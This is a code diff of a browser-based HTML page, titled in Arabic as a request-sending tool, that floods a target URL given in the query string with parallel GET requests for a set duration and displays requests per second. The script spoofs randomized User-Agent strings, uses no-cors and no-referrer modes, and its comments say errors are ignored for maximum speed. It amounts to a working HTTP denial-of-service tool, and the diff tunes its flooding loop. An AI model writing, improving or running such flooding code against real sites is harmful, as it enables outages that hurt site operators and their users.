@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>أداة إرسال طلبات</title>
     <script>
+        // دالة لتحليل البارامترات من URL
         function getQueryParams() {
             const params = new URLSearchParams(window.location.search);
             return {
@@ -13,21 +14,19 @@
             };
         }
 
+        // متغيرات التتبع
         let totalRequests = 0;
         let requestsPerSecond = 0;
         let intervalId;
         let isRunning = false;
 
+        // دالة لإنشاء عنوان IP عشوائي
         function getRandomIP() {
             return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
         }
 
+        // دالة لإرسال طلب سريع
         async function sendRequest(targetUrl) {
-            if (!isRunning) return;
-
-            const controller = new AbortController();
-            const timeout = setTimeout(() => controller.abort(), 1000); // وقت انتهاء 1 ثانية
-
             try {
                 const headers = {
                     'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 20) + 80}.0.${Math.floor(Math.random() * 4000)}.${Math.floor(Math.random() * 200)} Safari/537.36`,
@@ -37,31 +36,26 @@
                     'Pragma': 'no-cache'
                 };
 
-                const response = await fetch(targetUrl + `?cachebust=${Math.random().toString(36).slice(2)}`, {
+                await fetch(targetUrl, {
                     method: 'GET',
                     headers: headers,
-                    mode: 'cors', // تغيير إلى cors لضمان وصول الطلبات
+                    mode: 'no-cors',
                     cache: 'no-store',
-                    referrerPolicy: 'no-referrer',
-                    signal: controller.signal
+                    referrerPolicy: 'no-referrer'
                 });
-
-                if (response.ok || response.type === 'basic') {
+            } catch (e) {
+                // نتجاهل الأخطاء لأننا نريد السرعة القصوى
+            } finally {
+                if(isRunning) {
                     totalRequests++;
                     requestsPerSecond++;
                 }
-            } catch (e) {
-                // تجاهل الأخطاء غير الحرجة فقط
-                if (e.name !== 'AbortError') {
-                    console.log('خطأ:', e.message); // اختياري للتصحيح
-                }
-            } finally {
-                clearTimeout(timeout);
             }
         }
 
+        // دالة لبدء الإرسال
         function startSending(targetUrl, durationSeconds) {
-            if (!targetUrl) {
+            if(!targetUrl) {
                 document.body.textContent = 'خطأ: يرجى تحديد رابط الهدف عبر بارامتر url';
                 return;
             }
@@ -70,36 +64,47 @@
             const startTime = Date.now();
             const endTime = startTime + (durationSeconds * 1000);
 
+            // تحديث العداد كل ثانية
             intervalId = setInterval(() => {
                 document.body.textContent = `rps ${requestsPerSecond} total ${totalRequests}`;
                 requestsPerSecond = 0;
             }, 1000);
 
+            // دالة الإرسال المتواصل
             function sendLoop() {
-                if (!isRunning || Date.now() >= endTime) {
+                if(!isRunning) return;
+                
+                if(Date.now() >= endTime) {
                     stopSending();
                     return;
                 }
 
-                const parallelRequests = 50; // زيادة العدد للسرعة
-                const promises = [];
-                for (let i = 0; i < parallelRequests; i++) {
-                    promises.push(sendRequest(targetUrl));
+                // إرسال مجموعة من الطلبات بشكل متوازي
+                const parallelRequests = 20;
+                for(let i = 0; i < parallelRequests; i++) {
+                    sendRequest(targetUrl);
                 }
 
-                Promise.allSettled(promises).then(() => setTimeout(sendLoop, 0));
+                // استخدام setTimeout مع تأخير 0 للسماح بمعالجة الأحداث الأخرى
+                setTimeout(sendLoop, 0);
             }
 
             sendLoop();
+
+            // إيقاف الإرسال بعد الوقت المحدد
+            setTimeout(stopSending, durationSeconds * 1000);
         }
 
+        // دالة لإيقاف الإرسال
         function stopSending() {
             isRunning = false;
             clearInterval(intervalId);
-            document.body.textContent = `تم الانتهاء | rps ${requestsPerSecond} total ${totalRequests}`;
+            document.body.textContent = `rps ${requestsPerSecond} total ${totalRequests}`;
         }
 
+        // بدء التنفيذ عند تحميل الصفحة
         window.onload = function() {
+            // تهيئة نمط الصفحة
             document.body.style.margin = '0';
             document.body.style.padding = '0';
             document.body.style.fontFamily = 'monospace';
